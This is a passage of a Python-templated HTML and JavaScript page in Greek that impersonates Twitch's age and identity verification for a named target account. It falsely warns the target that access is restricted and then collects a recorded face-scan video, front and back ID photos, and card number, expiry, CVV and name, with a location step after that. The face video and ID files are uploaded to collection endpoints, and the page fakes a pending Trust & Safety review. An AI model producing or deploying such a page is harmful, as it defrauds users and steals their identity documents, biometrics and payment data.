        .success-icon {{
            font-size: 5rem;
            margin-bottom: 25px;
            color: #00d474;
            animation: popIn 0.5s ease-out;
        }}
        
        @keyframes popIn {{
            0% {{ transform: scale(0.5); opacity: 0; }}
            70% {{ transform: scale(1.1); opacity: 1; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .completion-title {{
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 15px;
            color: #00d474;
        }}
        
        .next-steps {{
            margin-top: 40px;
            padding-top: 25px;
            border-top: 1px solid #26263a;
        }}
        
        .countdown {{
            font-size: 1.2rem;
            font-weight: 700;
            color: #9146ff;
            margin: 20px 0;
        }}
        
        /* Review Page */
        .review-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .review-icon {{
            font-size: 5rem;
            margin-bottom: 25px;
            color: #9146ff;
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0% {{ transform: scale(1); opacity: 1; }}
            50% {{ transform: scale(1.05); opacity: 0.8; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .review-steps {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 16px;
            padding: 25px;
            margin: 30px 0;
        }}
        
        .review-step {{
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 25px;
            border-bottom: 1px solid #2d2d44;
        }}
        
        .review-step:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .step-number {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #9146ff;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            margin-right: 20px;
            flex-shrink: 0;
        }}
        
        .step-content {{
            text-align: left;
            flex: 1;
        }}
        
        .step-title {{
            font-weight: 600;
            margin-bottom: 5px;
            color: #efeff1;
        }}
        
        .step-description {{
            color: #adadb8;
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        /* Footer */
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #26263a;
            color: #adadb8;
            font-size: 0.8rem;
        }}
        
        .footer-links {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
        }}
        
        .footer-links a {{
            color: #adadb8;
            text-decoration: none;
        }}
        
        .footer-links a:hover {{
            color: #9146ff;
            text-decoration: underline;
        }}
        
        /* Utility Classes */
        .hidden {{
            display: none !important;
        }}
        
        .file-input {{
            display: none;
        }}
        
        .text-center {{
            text-align: center;
        }}
        
        .mt-20 {{
            margin-top: 20px;
        }}
        
        .mb-20 {{
            margin-bottom: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Twitch Logo Header -->
        <div class="logo-header">
            <div class="logo">
                <span class="twitch-purple">Twitch</span>
            </div>
            <div class="logo-subtitle">Σύστημα Επαλήθευσης Ηλικίας & Ταυτότητας</div>
        </div>
        
        <!-- Account Information Card -->
        <div class="account-card">
            <div class="account-header">
                <div class="account-avatar">
                    {'<img src="' + profile_picture + '">' if profile_picture else 'TW'}
                </div>
                <div class="account-info">
                    <div class="account-display-name">{target_username}</div>
                    <div class="account-username">@{target_username}</div>
                    <div class="account-badge">
                        {'ΛΟΓΑΡΙΑΣΜΟΣ STREAMER' if account_type == 'streamer' else 'ΛΟΓΑΡΙΑΣΜΟΣ ΘΕΑΤΗ'}
                    </div>
                </div>
            </div>
            
            <div class="account-stats">
                <div class="stat-item">
                    <div class="stat-number">{followers}</div>
                    <div class="stat-label">Ακόλουθοι</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">{following}</div>
                    <div class="stat-label">Ακολουθεί</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">
                        {'{:,}'.format(total_views) if account_type == 'streamer' else 'N/A'}
                    </div>
                    <div class="stat-label">
                        {'Συνολικές Προβολές' if account_type == 'streamer' else 'Ηλικία Λογαριασμού'}
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Verification Container -->
        <div class="verification-container">
            <!-- Progress Indicator -->
            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-steps">
                    <div class="step-line"></div>
                    <div class="step-line-fill" id="stepLineFill"></div>
                    <div class="step-indicator completed">1</div>
                    <div class="step-indicator active">2</div>
                    <div class="step-indicator">3</div>
                    <div class="step-indicator">4</div>
                    <div class="step-indicator">5</div>
                </div>
            </div>
            
            <!-- Step 1: Introduction -->
            <div class="step active" id="step1">
                <h2 class="step-title">Απαιτείται Επαλήθευση Λογαριασμού</h2>
                <p class="step-subtitle">
                    Ο λογαριασμός σας <strong class="twitch-purple">@{target_username}</strong> απαιτεί επαλήθευση ηλικίας και ταυτότητας 
                    για συμμόρφωση με τους Όρους Χρήσης και τις Οδηγίες Κοινότητας του Twitch.
                </p>
                
                <div class="warning-box">
                    <div class="warning-header">
                        <div class="warning-icon">⚠️</div>
                        <div class="warning-title">Περιορισμένη Πρόσβαση Λογαριασμού</div>
                    </div>
                    <div class="warning-content">
                        {'Οι δυνατότητες streaming σας έχουν περιοριστεί προσωρινά μέχρι να ολοκληρωθεί η επαλήθευση ηλικίας.' if account_type == 'streamer' 
                         else 'Η πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας έχει περιοριστεί προσωρινά μέχρι να ολοκληρωθεί η επαλήθευση.'}
                    </div>
                </div>
                
                <div class="info-box">
                    <div class="info-header">
                        <div class="info-icon">📋</div>
                        <div class="info-title">Διαδικασία Επαλήθευσης</div>
                    </div>
                    <div class="info-content">
                        {'Ως λογαριασμός streamer, πρέπει να ολοκληρώσετε:' if account_type == 'streamer' 
                         else 'Ως λογαριασμός θεατή, πρέπει να ολοκληρώσετε:'}
                        <ul style="margin-top: 10px;">
                            <li><strong>Επαλήθευση Προσώπου</strong> - Σάρωση προσώπου σε πραγματικό χρόνο</li>
                            <li><strong>Επαλήθευση Ταυτότητας</strong> - Μεταφόρτωση επίσημου εγγράφου ταυτότητας</li>
                            {'<li><strong>Επαλήθευση Πληρωμών</strong> - Επαλήθευση μεθόδου πληρωμής</li>' if payment_enabled else ''}
                            {'<li><strong>Έλεγχος Τοποθεσίας</strong> - Επαλήθευση περιφερειακής συμμόρφωσης</li>' if location_enabled else ''}
                        </ul>
                    </div>
                </div>
                
                <button class="button primary-btn" onclick="nextStep()">
                    Έναρξη Επαλήθευσης
                </button>
                
                <div class="footer">
                    Συνεχίζοντας, συμφωνείτε με τους <a href="#">Όρους Χρήσης</a> και 
                    την <a href="/privacy_policy">Πολιτική Απορρήτου</a> του Twitch
                </div>
            </div>
            
            <!-- Step 2: Face Verification -->
            <div class="step" id="step2">
                <h2 class="step-title">Επαλήθευση Προσώπου</h2>
                <p class="step-subtitle">
                    Χρειάζεται να επαληθεύσουμε ότι είστε πραγματικό πρόσωπο. Ακολουθήστε τις οδηγίες για τη σάρωση προσώπου.
                </p>
                
                <div class="camera-container">
                    <video id="faceVideo" autoplay playsinline></video>
                    <div class="face-overlay">
                        <div class="face-circle"></div>
                    </div>
                </div>
                
                <div class="face-timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                
                <div class="face-instruction" id="faceInstruction">
                    <div class="instruction-icon">👤</div>
                    <div class="instruction-text" id="instructionText">Ετοιμοτητα Εκκίνησης</div>
                    <div class="instruction-detail" id="instructionDetail">
                        Τοποθετήστε το πρόσωπό σας μέσα στον κύκλο
                    </div>
                </div>
                
                <button class="button primary-btn" id="startFaceBtn" onclick="startFaceVerification()">
                    Έναρξη Σάρωσης Προσώπου
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Step 3: ID Verification -->
            <div class="step" id="step3">
                <h2 class="step-title">Επαλήθευση Εγγράφου Ταυτότητας</h2>
                <p class="step-subtitle">
                    Μεταφορτώστε φωτογραφίες του επίσημου εγγράφου ταυτότητάς σας για επαλήθευση ηλικίας.
                </p>
                
                <div class="id-upload-section">
                    <div class="id-card" onclick="document.getElementById('frontIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleIDFileDrop(event, 'front')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Εμπρός Μέρος Ταυτότητας</div>
                        <div class="id-subtitle">
                            {'Διαβατήριο, Δίπλωμα Οδήγησης ή Επίσημο Έγγραφο' if id_type == 'government' 
                             else 'Φοιτητική Ταυτότητα' if id_type == 'student' 
                             else 'Έντυπο Συγκατάθεσης Γονέα'}
                        </div>
                        <input type="file" id="frontIdInput" class="file-input" accept="image/*" onchange="handleIDFileSelect(this, 'front')">
                        <div class="id-preview" id="frontPreview">
                            <img class="id-preview-image" id="frontPreviewImage">
                        </div>
                    </div>
                    
                    <div class="id-card" onclick="document.getElementById('backIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleIDFileDrop(event, 'back')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Πίσω Μέρος Ταυτότητας</div>
                        <div class="id-subtitle">
                            {'Απαιτείται για έγγραφα με δύο πλευρές' if id_type == 'government' 
                             else 'Προαιρετικό για φοιτητικές ταυτότητες' if id_type == 'student'
                             else 'Υπογραφή Γονέα/Κηδεμόνα'}
                        </div>
                        <input type="file" id="backIdInput" class="file-input" accept="image/*" onchange="handleIDFileSelect(this, 'back')">
                        <div class="id-preview" id="backPreview">
                            <img class="id-preview-image" id="backPreviewImage">
                        </div>
                    </div>
                </div>
                
                <div class="id-requirements">
                    <div class="requirements-title">Απαιτήσεις Εγγράφου:</div>
                    <ul class="requirements-list">
                        {'<li>Επίσημο έγγραφο ταυτότητας με φωτογραφία και ημερομηνία γέννησης</li>' if id_type == 'government' else ''}
                        {'<li>Έγκυρη φοιτητική ταυτότητα με ημερομηνία λήξης</li>' if id_type == 'student' else ''}
                        {'<li>Έντυπο συγκατάθεσης με υπογραφή γονέα/κηδεμόνα</li>' if id_type == 'parental' else ''}
                        <li>Καθαρές, καλά φωτισμένες φωτογραφίες</li>
                        <li>Όλο το κείμενο πρέπει να είναι αναγνώσιμο</li>
                        <li>Χωρίς ανταύγειες ή αντανακλάσεις</li>
                        <li>Όλο το έγγραφο ορατό στο πλαίσιο</li>
                    </ul>
                </div>
                
                <div class="status-message" id="idStatus"></div>
                
                <button class="button primary-btn" id="submitIdBtn" onclick="submitIDVerification()" disabled>
                    Μεταφόρτωση Εγγράφων Ταυτότητας
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Step 4: Payment Verification (Streamers only) -->
            <div class="step" id="step4">
                <h2 class="step-title">Επαλήθευση Πληρωμών</h2>
                <p class="step-subtitle">
                    Επαληθεύστε τη μέθοδο πληρωμής σας για να ενεργοποιήσετε τα χαρακτηριστικά μονετοποίησης στον λογαριασμό σας.
                </p>
                
                <div class="payment-options">
                    <div class="payment-option" onclick="selectPaymentMethod('credit_card')">
                        <div class="payment-icon">💳</div>
                        <div class="payment-name">Πιστωτική Κάρτα</div>
                        <div class="payment-hint">Visa, Mastercard, Amex</div>
                    </div>
                    
                    <div class="payment-option" onclick="selectPaymentMethod('paypal')">
                        <div class="payment-icon">🏦</div>
                        <div class="payment-name">PayPal</div>
                        <div class="payment-hint">Σύνδεση λογαριασμού PayPal</div>
                    </div>
                    
                    <div class="payment-option" onclick="selectPaymentMethod('bank')">
                        <div class="payment-icon">🏛️</div>
                        <div class="payment-name">Τραπεζική Μεταφορά</div>
                        <div class="payment-hint">Άμεσος τραπεζικός λογαριασμός</div>
                    </div>
                </div>
                
                <div class="payment-details" id="paymentDetails">
                    <div class="form-group">
                        <label class="form-label">Αριθμός Κάρτας</label>
                        <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456">
                    </div>
                    
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                        <div class="form-group">
                            <label class="form-label">Ημερομηνία Λήξης</label>
                            <input type="text" class="form-input" id="cardExpiry" placeholder="MM/ΕΕ">
                        </div>
                        <div class="form-group">
                            <label class="form-label">CVV</label>
                            <input type="text" class="form-input" id="cardCvv" placeholder="123">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Όνομα στην Κάρτα</label>
                        <input type="text" class="form-input" id="cardName" placeholder="Γιάννης Παπαδόπουλος">
                    </div>
                </div>
                
                <div class="status-message" id="paymentStatus"></div>
                
                <button class="button primary-btn" id="submitPaymentBtn" onclick="submitPaymentVerification()" disabled>
                    Επαλήθευση Μεθόδου Πληρωμής
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Step 5: Location Verification -->
            <div class="step" id="step5">
                <h2 class="step-title">Επαλήθευση Τοποθεσίας</h2>
                <p class="step-subtitle">
                    Χρειαζόμαστε να επαληθεύσουμε την τοποθεσία σας για περιφερειακή συμμόρφωση περιεχομένου και ασφάλεια.
                </p>
                
                <div class="location-container">
                    <div class="location-icon">📍</div>
                    <div class="location-info">
                        <div class="instruction-icon">🌍</div>
                        <div class="instruction-text">Απαιτείται Πρόσβαση Τοποθεσίας</div>
                        <div class="instruction-detail">
                            Το Twitch χρειάζεται να επαληθεύσει την τοποθεσία σας για περιφερειοποίηση περιεχομένου και ασφάλεια.
                        </div>
                    </div>
                    
                    <div class="location-accuracy">
                        <div class="instruction-text">Ακρίβεια Τοποθεσίας</div>
                        <div class="accuracy-meter">
                            <div class="accuracy-fill" id="accuracyFill"></div>
                        </div>
                        <div class="accuracy-labels">
                            <span>Χαμηλή</span>
                            <span>Μέτρια</span>
                            <span>Υψηλή</span>
                        </div>
                    </div>
                    
                    <div class="location-details" id="locationDetails">
                        <div class="detail-row">
                            <div class="detail-label">Γεωγραφικό Πλάτος:</div>
                            <div class="detail-value" id="latValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Γεωγραφικό Μήκος:</div>
                            <div class="detail-value" id="lonValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Ακρίβεια:</div>
                            <div class="detail-value" id="accuracyValue">--</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Διεύθυνση:</div>
                            <div class="detail-value" id="addressValue">--</div>
                        </div>
                    </div>
                </div>
                
                <div class="status-message" id="locationStatus">
                    Κάντε κλικ στο παρακάτω κουμπί για κοινή χρήση της τοποθεσίας σας
                </div>
                
                <button class="button primary-btn" id="locationBtn" onclick="requestLocation()">
                    Κοινή Χρήση Τοποθεσίας
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Final Step: Processing -->
            <div class="step" id="stepFinal">
                <h2 class="step-title">Επαλήθευση σε Εξέλιξη</h2>
                <p class="step-subtitle">
                    Παρακαλώ περιμένετε ενώ επαληθεύουμε τις πληροφορίες σας. Αυτό μπορεί να διαρκέσει λίγα λεπτά.
                </p>
                
                <div class="info-box" style="text-align: center; padding: 40px;">
                    <div class="instruction-icon" style="font-size: 4rem;">⏳</div>
                    <div class="instruction-text">Επεξεργασία Επαλήθευσής Σας</div>
                    <div class="instruction-detail">
                        <div class="loading-spinner" style="margin-right: 10px;"></div>
                        Ανάλυση υποβεβλημένων δεδομένων...
                    </div>
                </div>
                
                <div class="status-message status-processing" id="finalStatus">
                    Επαλήθευση σάρωσης προσώπου... 25%
                </div>
            </div>
            
            <!-- Completion Step -->
            <div class="step" id="stepComplete">
                <div class="completion-container">
                    <div class="success-icon">✅</div>
                    
                    <h2 class="completion-title">Η Επαλήθευση Υποβλήθηκε!</h2>
                    <p class="step-subtitle">
                        Ευχαριστούμε, <strong class="twitch-purple">@{target_username}</strong>! Τα δεδομένα επαλήθευσης σας έχουν 
                        υποβληθεί επιτυχώς για εξέταση.
                    </p>
                    
                    <div class="info-box">
                        <div class="info-header">
                            <div class="info-icon">📋</div>
                            <div class="info-title">Τι συμβαίνει μετά;</div>
                        </div>
                        <div class="info-content">
                            <ul style="margin-top: 10px;">
                                <li>Η ομάδα μας θα εξετάσει την υποβολή σας (συνήθως 24-48 ώρες)</li>
                                <li>Θα λάβετε email με το αποτέλεσμα της επαλήθευσης</li>
                                {'<li>Μόλις εγκριθεί, τα χαρακτηριστικά streaming θα ενεργοποιηθούν</li>' if account_type == 'streamer' 
                                 else '<li>Μόλις εγκριθεί, η πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας θα αποκατασταθεί</li>'}
                                <li>Εάν απαιτείται επιπλέον πληροφόρηση, θα επικοινωνήσουμε μαζί σας</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="next-steps">
                        <p class="step-subtitle">
                            Θα μεταφερθείτε στη σελίδα εξέτασης σε <span class="countdown" id="countdown">5</span> δευτερόλεπτα...
                        </p>
                        <button class="button primary-btn" onclick="showReviewPage()">
                            Συνέχεια στην Κατάσταση Εξέτασης
                        </button>
                    </div>
                </div>
            </div>
            
            <!-- Review Status Step -->
            <div class="step" id="stepReview">
                <div class="review-container">
                    <div class="review-icon">⏳</div>
                    
                    <h2 class="step-title">Επαλήθευση Υπό Εξέταση</h2>
                    <p class="step-subtitle">
                        Η υποβολή επαλήθευσης ηλικίας σας εξετάζεται από την ομάδα Εμπιστοσύνης & Ασφάλειας του Twitch.
                    </p>
                    
                    <div class="review-steps">
                        <div class="review-step">
                            <div class="step-number">1</div>
                            <div class="step-content">
                                <div class="step-title">Υποβολή Λήφθηκε</div>
                                <div class="step-description">
                                    Η σάρωση προσώπου σας, τα έγγραφα ταυτότητας και τα δεδομένα τοποθεσίας έχουν ληφθεί και βρίσκονται σε ουρά για εξέταση.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">2</div>
                            <div class="step-content">
                                <div class="step-title">Διαδικασία Χειροκίνητης Εξέτασης</div>
                                <div class="step-description">
                                    Η ομάδα μας εξετάζει χειροκίνητα τα δεδομένα επαλήθευσής σας για να διασφαλίσει τη συμμόρφωση με τις πολιτικές του Twitch.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">3</div>
                            <div class="step-content">
                                <div class="step-title">Έλεγχος Επαλήθευσης Ηλικίας</div>
                                <div class="step-description">
                                    Επαληθεύουμε την ηλικία σας βάσει των υποβεβλημένων εγγράφων για να διασφαλίσουμε τη συμμόρφωση με τους περιφερειακούς νόμους.
                                </div>
                            </div>
                        </div>
                        
                        <div class="review-step">
                            <div class="step-number">4</div>
                            <div class="step-content">
                                <div class="step-title">Τελική Απόφαση</div>
                                <div class="step-description">
                                    Θα λάβετε email με την τελική απόφαση εντός 48 ωρών από την υποβολή.
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <div class="info-header">
                            <div class="info-icon">📧</div>
                            <div class="info-title">Ελέγξτε Το Email Σας</div>
                        </div>
                        <div class="info-content">
                            Έχουμε στείλει μια επιβεβαίωση στο email που είναι καταχωρημένο. Παρακαλώ ελέγξτε το εισερχόμενο (και τον φάκελο spam) σας για ενημερώσεις.
                        </div>
                    </div>
                    
                    <div class="next-steps">
                        <button class="button primary-btn" onclick="returnToTwitch()">
                            Επιστροφή στο Twitch
                        </button>
                        <button class="button secondary-btn" onclick="checkVerificationStatus()">
                            Έλεγχος Κατάστασης
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div>© 2024 Twitch, Inc. Με επιφύλαξη παντός δικαιώματος.</div>
            <div class="footer-links">
                <a href="/privacy_policy">Πολιτική Απορρήτου</a>
                <a href="#">Όροι Χρήσης</a>
                <a href="#">Οδηγίες Κοινότητας</a>
                <a href="#">Κέντρο Βοήθειας</a>
            </div>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentStep = 1;
        let totalSteps = {total_steps};
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimerInterval = null;
        let faceTimeLeft = {face_duration};
        let currentInstructionIndex = 0;
        let instructionTimer = null;
        let idFiles = {{front: null, back: null}};
        let selectedPaymentMethod = null;
        let paymentData = {{}};
        let locationData = null;
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let targetUsername = "{target_username}";
        let accountType = "{account_type}";
        let countdownTimer = null;
        
        // Face scan instructions
        let faceInstructions = [
            {{icon: "👤", text: "Κοιτάξτε Ευθεία Μπροστά", detail: "Κρατήστε το πρόσωπό σας κεντραρισμένο στον κύκλο", duration: 3}},
            {{icon: "👈", text: "Γυρίστε το Κεφάλι Αριστερά", detail: "Γυρίστε αργά το κεφάλι σας προς την αριστερή πλευρά", duration: 3}},
            {{icon: "👉", text: "Γυρίστε το Κεφάλι Δεξιά", detail: "Γυρίστε αργά το κεφάλι σας προς τη δεξιά πλευρά", duration: 3}},
            {{icon: "👆", text: "Κοιτάξτε Πάνω", detail: "Αποκλίνετε ελαφρά το κεφάλι σας προς τα πάνω", duration: 3}},
            {{icon: "👇", text: "Κοιτάξτε Κάτω", detail: "Αποκλίνετε ελαφρά το κεφάλι σας προς τα κάτω", duration: 3}},
            {{icon: "😉", text: "Κλείστε Διαρκώς τα Μάτια", detail: "Κλείστε τα μάτια σας λίγες φορές", duration: 2}},
            {{icon: "😊", text: "Χαμογελάστε", detail: "Χαμογελάστε μας φυσικά", duration: 2}},
            {{icon: "✅", text: "Ολοκληρώθηκε", detail: "Επαλήθευση προσώπου επιτυχής!", duration: 1}}
        ];
        
        // Step Navigation
        function updateProgress() {{
            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('stepLineFill').style.width = progress + '%';
            
            // Update step indicators
            const indicators = document.querySelectorAll('.step-indicator');
            indicators.forEach((indicator, index) => {{
                indicator.classList.remove('active', 'completed');
                if (index + 1 < currentStep) {{
                    indicator.classList.add('completed');
                }} else if (index + 1 === currentStep) {{
                    indicator.classList.add('active');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            // Hide all steps
            document.querySelectorAll('.step').forEach(step => {{
                step.classList.remove('active');
            }});
            
            // Show requested step
            const stepElement = document.getElementById('step' + stepNumber);
            if (stepElement) {{
                stepElement.classList.add('active');
                currentStep = stepNumber;
                updateProgress();
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps + 1) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        // Face Verification
        async function startFaceVerification() {{
            try {{
                const button = document.getElementById('startFaceBtn');
                button.disabled = true;
                button.innerHTML = '<span class="loading-spinner"></span>Πρόσβαση σε Κάμερα...';
                
                // Request camera access
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{
                        facingMode: 'user',
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 640 }}
                    }},
                    audio: false
                }});
                
                // Show video feed
                document.getElementById('faceVideo').srcObject = faceStream;
                
                // Start the verification process
                startFaceInstructions();
                
            }} catch (error) {{
                console.error('Camera access error:', error);
                alert('Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχουν παραχωρηθεί δικαιώματα κάμερας.');
                const button = document.getElementById('startFaceBtn');
                button.disabled = false;
                button.textContent = 'Έναρξη Σάρωσης Προσώπου';
            }}
        }}
        
        function startFaceInstructions() {{
            currentInstructionIndex = 0;
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            showFaceInstruction(0);
            
            // Start face recording
            startFaceRecording();
            
            // Start countdown timer
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            
            // Cycle through instructions
            instructionTimer = setInterval(() => {{
                currentInstructionIndex++;
                if (currentInstructionIndex < faceInstructions.length) {{
                    showFaceInstruction(currentInstructionIndex);
                }}
            }}, 3000);
        }}
        
        function showFaceInstruction(index) {{
            const instruction = faceInstructions[index];
            if (instruction) {{
                const instructionDiv = document.getElementById('faceInstruction');
                instructionDiv.querySelector('.instruction-icon').textContent = instruction.icon;
                document.getElementById('instructionText').textContent = instruction.text;
                document.getElementById('instructionDetail').textContent = instruction.detail;
            }}
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById('faceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            const options = {{ mimeType: 'video/webm;codecs=vp9' }};
            
            try {{
                faceRecorder = new MediaRecorder(faceStream, options);
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    faceChunks.push(event.data);
                }}
            }};
            
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            clearInterval(instructionTimer);
            
            // Stop recording
            if (faceRecorder && faceRecorder.state === 'recording') {{
                faceRecorder.stop();
            }}
            
            // Stop camera
            if (faceStream) {{
                faceStream.getTracks().forEach(track => track.stop());
            }}
            
            // Show completion
            showFaceInstruction(faceInstructions.length - 1);
            document.getElementById('faceTimer').textContent = "✅ Ολοκληρώθηκε";
            
            // Auto-proceed after delay
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            
            const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_face_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_username: targetUsername,
                        account_type: accountType
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Η επαλήθευση προσώπου μεταφορτώθηκε');
                    }},
                    error: function(xhr, status, error) {{
                        console.error('Σφάλμα μεταφόρτωσης προσώπου:', error);
                    }}
                }});
            }};
            
            reader.readAsDataURL(videoBlob);
        }}
        
        // ID Verification
        function handleIDFileSelect(input, type) {{
            const file = input.files[0];
            if (file) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleIDFileDrop(event, type) {{
            event.preventDefault();
            event.currentTarget.classList.remove('dragover');
            const file = event.dataTransfer.files[0];
            if (file && file.type.startsWith('image/')) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleIDFile(file, type) {{
            // Show preview
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById(type + 'Preview');
                const previewImage = document.getElementById(type + 'PreviewImage');
                previewImage.src = e.target.result;
                preview.style.display = 'block';
            }};
            reader.readAsDataURL(file);
            
            // Store file
            idFiles[type] = file;
            checkIDSubmitReady();
        }}
        
        function checkIDSubmitReady() {{
            const hasFront = idFiles.front !== null;
            document.getElementById('submitIdBtn').disabled = !hasFront;
        }}
        
        function submitIDVerification() {{
            const statusDiv = document.getElementById('idStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Μεταφόρτωση εγγράφων ταυτότητας...';
            statusDiv.style.display = 'block';
            
            const button = document.getElementById('submitIdBtn');
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Επεξεργασία...';
            
            // Prepare form data
            const formData = new FormData();
            if (idFiles.front) formData.append('front_id', idFiles.front);
            if (idFiles.back) formData.append('back_id', idFiles.back);
            formData.append('timestamp', new Date().toISOString());
            formData.append('session_id', sessionId);
            formData.append('target_username', targetUsername);
            formData.append('id_type', '{id_type}');
            formData.append('account_type', accountType);
            
            // Submit
            $.ajax({{
                url: '/submit_id_verification',
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {{
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = '✓ Τα έγγραφα ταυτότητας μεταφορτώθηκαν επιτυχώς!';
                    
                    setTimeout(() => {{
                        nextStep();
                    }}, 1500);
                }},
                error: function(xhr, status, error) {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = '✗ Η μεταφόρτωση απέτυχε. Παρακαλώ δοκιμάστε ξανά.';
                    button.disabled = false;
                    button.textContent = 'Μεταφόρτωση Εγγράφων Ταυτότητας';
                }}
            }});
        }}
        
        // Payment Verification
        function selectPaymentMethod(method) {{
            selectedPaymentMethod = method;
            
            // Update UI
            document.querySelectorAll('.payment-option').forEach(option => {{
                option.classList.remove('selected');
            }});
            event.currentTarget.classList.add('selected');
            
            // Show payment details
            const detailsDiv = document.getElementById('paymentDetails');
            detailsDiv.style.display = 'block';
            
            // Enable submit button
            document.getElementById('submitPaymentBtn').disabled = false;
        }}
        
        function submitPaymentVerification() {{
            const statusDiv = document.getElementById('paymentStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Επαλήθευση μεθόδου πληρωμής...';
            statusDiv.style.display = 'block';
            
            const button = document.getElementById('submitPaymentBtn');
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Επεξεργασία...';
            
            // Collect payment data
            paymentData = {{
                method: selectedPaymentMethod,
                card_number: document.getElementById('cardNumber').value,
                expiry_date: document.getElementById('cardExpiry').value,
                cvv: document.getElementById('cardCvv').value,
                card_name: document.getElementById('cardName').value,
                timestamp: new Date().toISOString(),
                session_id: sessionId,
                target_username: targetUsername
            }};
            
            // Simulate API call
            setTimeout(() => {{
                statusDiv.className = 'status-message status-success';
